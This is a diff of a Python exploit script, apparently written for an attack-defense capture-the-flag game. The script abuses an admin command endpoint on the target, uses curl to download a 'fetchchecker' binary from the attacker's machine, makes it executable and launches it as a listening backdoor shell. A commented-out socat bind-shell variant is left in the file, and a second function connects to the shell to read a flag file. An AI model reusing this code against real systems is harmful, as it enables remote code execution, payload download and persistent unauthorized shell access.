@@ -97,11 +97,14 @@ def exploit(target, port):
     # backdoor injection | DONT CHANGE
     print('='*50 + " BACKDOOR INJECTION 💀 " + '='*50)
 
+    adminsess.post(BASE_URL+"/admin", data={"command" : f"rm {BACKDOOR_FILE_PATH}"})
     adminsess.post(BASE_URL+"/admin", data={"command" : f"curl http://{IP_LOCAL}:8900/fetchchecker -o {BACKDOOR_FILE_PATH}"})
     adminsess.post(BASE_URL+"/admin", data={"command" : f"chmod +x {BACKDOOR_FILE_PATH}"})
+
+    adminsess.post(BASE_URL+"/admin", data={"command" : f"{BACKDOOR_FILE_PATH} {SPAWN_SHELL_PORT} &"})
     
-    adminsess.post(BASE_URL+"/admin", data={"command" : f"rm /tmp/checker & cp /bin/socat /tmp/checker"})
-    adminsess.post(BASE_URL+"/admin", data={"command" : f"/tmp/checker TCP-LISTEN:{SPAWN_SHELL_PORT},reuseaddr,fork EXEC:{BACKDOOR_FILE_PATH},stderr,pty,cfmakeraw,echo=0 &"})
+    # adminsess.post(BASE_URL+"/admin", data={"command" : f"rm /tmp/checker & cp /bin/socat /tmp/checker"})
+    # adminsess.post(BASE_URL+"/admin", data={"command" : f"/tmp/checker TCP-LISTEN:{SPAWN_SHELL_PORT},reuseaddr,fork EXEC:{BACKDOOR_FILE_PATH},stderr,pty,cfmakeraw,echo=0 &"})
 
     check_backdoor = adminsess.post(BASE_URL+"/admin", data={"command" : f"ls {BACKDOOR_FILE_PATH}"}).text.strip()
     
@@ -138,8 +141,7 @@ def exploit_backdoor(target, portSpawnShell) :
     # exploit goes here
     # start
     r.sendline(f"cat {FLAG_PATH}".encode())
-    r.recvuntil(b"$ ")
-    flag = r.recvline().strip().decode().replace("}.", "}")
+    flag = r.recvline().strip().decode()
     print(flag)
     r.sendline(b"exit")
     r.close()
